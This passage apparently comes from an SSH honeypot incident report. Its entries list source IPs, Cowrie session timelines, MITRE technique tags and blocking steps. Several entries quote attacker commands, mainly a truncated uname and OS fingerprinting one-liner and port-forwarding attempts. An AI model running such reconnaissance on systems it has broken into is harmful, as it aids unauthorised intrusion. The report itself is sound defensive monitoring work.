| `2026-08-04 13:36:24` | `cowrie.command.input` |
| `2026-08-04 13:36:24` | `cowrie.command.input` |
| `2026-08-04 13:36:24` | `cowrie.command.input` |
| `2026-08-04 13:36:25` | `cowrie.log.closed` |
| `2026-08-04 13:36:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfbe64102ada

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:37 |
| **Last Seen** | 2026-08-04 13:37 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:37:39` | `cowrie.session.connect` |
| `2026-08-04 13:37:39` | `cowrie.client.version` |
| `2026-08-04 13:37:39` | `cowrie.client.kex` |
| `2026-08-04 13:37:40` | `cowrie.login.success` |
| `2026-08-04 13:37:40` | `cowrie.session.params` |
| `2026-08-04 13:37:40` | `cowrie.command.input` |
| `2026-08-04 13:37:41` | `cowrie.log.closed` |
| `2026-08-04 13:37:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bac518ecc28b

| Field | Detail |
|---|---|
| **Source IP** | `218.4.156[.]254` |
| **First Seen** | 2026-08-04 13:37 |
| **Last Seen** | 2026-08-04 13:37 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:37:43` | `cowrie.session.connect` |
| `2026-08-04 13:37:44` | `cowrie.client.version` |
| `2026-08-04 13:37:44` | `cowrie.client.kex` |
| `2026-08-04 13:37:46` | `cowrie.login.success` |
| `2026-08-04 13:37:47` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.4.156[.]254` to AbuseIPDB if not already reported
- [ ] Block `218.4.156[.]254` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c45e3b138d4d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:37 |
| **Last Seen** | 2026-08-04 13:37 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:37:48` | `cowrie.session.connect` |
| `2026-08-04 13:37:48` | `cowrie.client.version` |
| `2026-08-04 13:37:48` | `cowrie.client.kex` |
| `2026-08-04 13:37:49` | `cowrie.login.success` |
| `2026-08-04 13:37:51` | `cowrie.session.params` |
| `2026-08-04 13:37:51` | `cowrie.command.input` |
| `2026-08-04 13:37:51` | `cowrie.command.input` |
| `2026-08-04 13:37:51` | `cowrie.command.input` |
| `2026-08-04 13:37:51` | `cowrie.command.input` |
| `2026-08-04 13:37:51` | `cowrie.command.input` |
| `2026-08-04 13:37:51` | `cowrie.command.success` |
| `2026-08-04 13:37:51` | `cowrie.command.input` |
| `2026-08-04 13:37:51` | `cowrie.command.input` |
| `2026-08-04 13:37:51` | `cowrie.command.input` |
| `2026-08-04 13:37:51` | `cowrie.command.input` |
| `2026-08-04 13:37:52` | `cowrie.log.closed` |
| `2026-08-04 13:37:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d95b50e5ab1a

| Field | Detail |
|---|---|
| **Source IP** | `115.241.228[.]34` |
| **First Seen** | 2026-08-04 13:37 |
| **Last Seen** | 2026-08-04 13:38 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:37:52` | `cowrie.session.connect` |
| `2026-08-04 13:37:53` | `cowrie.client.version` |
| `2026-08-04 13:37:53` | `cowrie.client.kex` |
| `2026-08-04 13:37:55` | `cowrie.login.success` |
| `2026-08-04 13:37:56` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:38:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.241.228[.]34` to AbuseIPDB if not already reported
- [ ] Block `115.241.228[.]34` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce2f735bc2a6

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]210` |
| **First Seen** | 2026-08-04 13:39 |
| **Last Seen** | 2026-08-04 13:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:39:13` | `cowrie.session.connect` |
| `2026-08-04 13:39:13` | `cowrie.client.version` |
| `2026-08-04 13:39:13` | `cowrie.client.kex` |
| `2026-08-04 13:39:13` | `cowrie.login.success` |
| `2026-08-04 13:39:13` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:39:14` | `cowrie.direct-tcpip.data` |
| `2026-08-04 13:39:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]210` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f37832b4831

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:39 |
| **Last Seen** | 2026-08-04 13:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:39:14` | `cowrie.session.connect` |
| `2026-08-04 13:39:14` | `cowrie.client.version` |
| `2026-08-04 13:39:14` | `cowrie.client.kex` |
| `2026-08-04 13:39:15` | `cowrie.login.success` |
| `2026-08-04 13:39:15` | `cowrie.session.params` |
| `2026-08-04 13:39:15` | `cowrie.command.input` |
| `2026-08-04 13:39:16` | `cowrie.log.closed` |
| `2026-08-04 13:39:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dbc70f11e930

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:39 |
| **Last Seen** | 2026-08-04 13:39 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:39:16` | `cowrie.session.connect` |
| `2026-08-04 13:39:16` | `cowrie.client.version` |
| `2026-08-04 13:39:16` | `cowrie.client.kex` |
| `2026-08-04 13:39:18` | `cowrie.login.success` |
| `2026-08-04 13:39:19` | `cowrie.session.params` |
| `2026-08-04 13:39:19` | `cowrie.command.input` |
| `2026-08-04 13:39:19` | `cowrie.command.input` |
| `2026-08-04 13:39:19` | `cowrie.command.input` |
| `2026-08-04 13:39:19` | `cowrie.command.input` |
| `2026-08-04 13:39:19` | `cowrie.command.input` |
| `2026-08-04 13:39:19` | `cowrie.command.success` |
| `2026-08-04 13:39:19` | `cowrie.command.input` |
| `2026-08-04 13:39:19` | `cowrie.command.input` |
| `2026-08-04 13:39:19` | `cowrie.command.input` |
| `2026-08-04 13:39:19` | `cowrie.command.input` |
| `2026-08-04 13:39:19` | `cowrie.log.closed` |
| `2026-08-04 13:39:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-50866e9bbb68

| Field | Detail |
|---|---|
| **Source IP** | `93.152.221[.]210` |
| **First Seen** | 2026-08-04 13:40 |
| **Last Seen** | 2026-08-04 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:40:09` | `cowrie.session.connect` |
| `2026-08-04 13:40:09` | `cowrie.client.version` |
| `2026-08-04 13:40:09` | `cowrie.client.kex` |
| `2026-08-04 13:40:09` | `cowrie.login.success` |
| `2026-08-04 13:40:09` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:40:10` | `cowrie.direct-tcpip.data` |
| `2026-08-04 13:40:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `93.152.221[.]210` to AbuseIPDB if not already reported
- [ ] Block `93.152.221[.]210` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a9229e8e2d9c

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:40 |
| **Last Seen** | 2026-08-04 13:40 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:40:47` | `cowrie.session.connect` |
| `2026-08-04 13:40:47` | `cowrie.client.version` |
| `2026-08-04 13:40:47` | `cowrie.client.kex` |
| `2026-08-04 13:40:49` | `cowrie.login.success` |
| `2026-08-04 13:40:51` | `cowrie.session.params` |
| `2026-08-04 13:40:51` | `cowrie.command.input` |
| `2026-08-04 13:40:51` | `cowrie.command.input` |
| `2026-08-04 13:40:51` | `cowrie.command.input` |
| `2026-08-04 13:40:51` | `cowrie.command.input` |
| `2026-08-04 13:40:51` | `cowrie.command.input` |
| `2026-08-04 13:40:51` | `cowrie.command.success` |
| `2026-08-04 13:40:51` | `cowrie.command.input` |
| `2026-08-04 13:40:51` | `cowrie.command.input` |
| `2026-08-04 13:40:51` | `cowrie.command.input` |
| `2026-08-04 13:40:51` | `cowrie.command.input` |
| `2026-08-04 13:40:51` | `cowrie.log.closed` |
| `2026-08-04 13:40:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a172a5d3e17

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:40 |
| **Last Seen** | 2026-08-04 13:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:40:54` | `cowrie.session.connect` |
| `2026-08-04 13:40:54` | `cowrie.client.version` |
| `2026-08-04 13:40:54` | `cowrie.client.kex` |
| `2026-08-04 13:40:54` | `cowrie.login.success` |
| `2026-08-04 13:40:55` | `cowrie.session.params` |
| `2026-08-04 13:40:55` | `cowrie.command.input` |
| `2026-08-04 13:40:55` | `cowrie.log.closed` |
| `2026-08-04 13:40:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea3579d62877

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:42 |
| **Last Seen** | 2026-08-04 13:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:42:18` | `cowrie.session.connect` |
| `2026-08-04 13:42:19` | `cowrie.client.version` |
| `2026-08-04 13:42:19` | `cowrie.client.kex` |
| `2026-08-04 13:42:20` | `cowrie.login.success` |
| `2026-08-04 13:42:22` | `cowrie.session.params` |
| `2026-08-04 13:42:22` | `cowrie.command.input` |
| `2026-08-04 13:42:22` | `cowrie.command.input` |
| `2026-08-04 13:42:22` | `cowrie.command.input` |
| `2026-08-04 13:42:22` | `cowrie.command.input` |
| `2026-08-04 13:42:22` | `cowrie.command.input` |
| `2026-08-04 13:42:22` | `cowrie.command.success` |
| `2026-08-04 13:42:22` | `cowrie.command.input` |
| `2026-08-04 13:42:22` | `cowrie.command.input` |
| `2026-08-04 13:42:22` | `cowrie.command.input` |
| `2026-08-04 13:42:22` | `cowrie.command.input` |
| `2026-08-04 13:42:22` | `cowrie.log.closed` |
| `2026-08-04 13:42:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a41c860d4d1

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:42 |
| **Last Seen** | 2026-08-04 13:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:42:31` | `cowrie.session.connect` |
| `2026-08-04 13:42:31` | `cowrie.client.version` |
| `2026-08-04 13:42:31` | `cowrie.client.kex` |
| `2026-08-04 13:42:31` | `cowrie.login.success` |
| `2026-08-04 13:42:32` | `cowrie.session.params` |
| `2026-08-04 13:42:32` | `cowrie.command.input` |
| `2026-08-04 13:42:32` | `cowrie.log.closed` |
| `2026-08-04 13:42:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-590fd28c54fb

| Field | Detail |
|---|---|
| **Source IP** | `220.189.253[.]198` |
| **First Seen** | 2026-08-04 13:43 |
| **Last Seen** | 2026-08-04 13:43 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:43:02` | `cowrie.session.connect` |
| `2026-08-04 13:43:03` | `cowrie.client.version` |
| `2026-08-04 13:43:03` | `cowrie.client.kex` |
| `2026-08-04 13:43:06` | `cowrie.login.success` |
| `2026-08-04 13:43:08` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:43:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `220.189.253[.]198` to AbuseIPDB if not already reported
- [ ] Block `220.189.253[.]198` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2ca5413e6c2d

| Field | Detail |
|---|---|
| **Source IP** | `180.94.75[.]114` |
| **First Seen** | 2026-08-04 13:43 |
| **Last Seen** | 2026-08-04 13:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:43:13` | `cowrie.session.connect` |
| `2026-08-04 13:43:14` | `cowrie.client.version` |
| `2026-08-04 13:43:14` | `cowrie.client.kex` |
| `2026-08-04 13:43:15` | `cowrie.login.success` |
| `2026-08-04 13:43:16` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:43:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.94.75[.]114` to AbuseIPDB if not already reported
- [ ] Block `180.94.75[.]114` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8cdc1a70135e

| Field | Detail |
|---|---|
| **Source IP** | `182.75.197[.]174` |
| **First Seen** | 2026-08-04 13:43 |
| **Last Seen** | 2026-08-04 13:43 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:43:25` | `cowrie.session.connect` |
| `2026-08-04 13:43:26` | `cowrie.client.version` |
| `2026-08-04 13:43:26` | `cowrie.client.kex` |
| `2026-08-04 13:43:28` | `cowrie.login.success` |
| `2026-08-04 13:43:29` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.197[.]174` to AbuseIPDB if not already reported
- [ ] Block `182.75.197[.]174` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5f843d6b53fb

| Field | Detail |
|---|---|
| **Source IP** | `61.143.227[.]17` |
| **First Seen** | 2026-08-04 13:43 |
| **Last Seen** | 2026-08-04 13:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:43:34` | `cowrie.session.connect` |
| `2026-08-04 13:43:35` | `cowrie.client.version` |
| `2026-08-04 13:43:35` | `cowrie.client.kex` |
| `2026-08-04 13:43:37` | `cowrie.login.success` |
| `2026-08-04 13:43:38` | `cowrie.direct-tcpip.request` |
| `2026-08-04 13:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `61.143.227[.]17` to AbuseIPDB if not already reported
- [ ] Block `61.143.227[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-445ddd5b31f0

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:43 |
| **Last Seen** | 2026-08-04 13:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:43:52` | `cowrie.session.connect` |
| `2026-08-04 13:43:52` | `cowrie.client.version` |
| `2026-08-04 13:43:52` | `cowrie.client.kex` |
| `2026-08-04 13:43:54` | `cowrie.login.success` |
| `2026-08-04 13:43:55` | `cowrie.session.params` |
| `2026-08-04 13:43:55` | `cowrie.command.input` |
| `2026-08-04 13:43:55` | `cowrie.command.input` |
| `2026-08-04 13:43:55` | `cowrie.command.input` |
| `2026-08-04 13:43:55` | `cowrie.command.input` |
| `2026-08-04 13:43:55` | `cowrie.command.input` |
| `2026-08-04 13:43:55` | `cowrie.command.success` |
| `2026-08-04 13:43:55` | `cowrie.command.input` |
| `2026-08-04 13:43:55` | `cowrie.command.input` |
| `2026-08-04 13:43:55` | `cowrie.command.input` |
| `2026-08-04 13:43:55` | `cowrie.command.input` |
| `2026-08-04 13:43:55` | `cowrie.log.closed` |
| `2026-08-04 13:43:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-77d605e33346

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]240` |
| **First Seen** | 2026-08-04 13:44 |
| **Last Seen** | 2026-08-04 13:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/bin/./uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:44:06` | `cowrie.session.connect` |
| `2026-08-04 13:44:06` | `cowrie.client.version` |
| `2026-08-04 13:44:06` | `cowrie.client.kex` |
| `2026-08-04 13:44:06` | `cowrie.login.success` |
| `2026-08-04 13:44:07` | `cowrie.session.params` |
| `2026-08-04 13:44:07` | `cowrie.command.input` |
| `2026-08-04 13:44:07` | `cowrie.log.closed` |
| `2026-08-04 13:44:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]240` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]240` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0dd42ad9666d

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-08-04 13:45 |
| **Last Seen** | 2026-08-04 13:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-04 13:45:28` | `cowrie.session.connect` |
| `2026-08-04 13:45:28` | `cowrie.client.version` |
| `2026-08-04 13:45:28` | `cowrie.client.kex` |
| `2026-08-04 13:45:29` | `cowrie.login.success` |
| `2026-08-04 13:45:31` | `cowrie.session.params` |
| `2026-08-04 13:45:31` | `cowrie.command.input` |
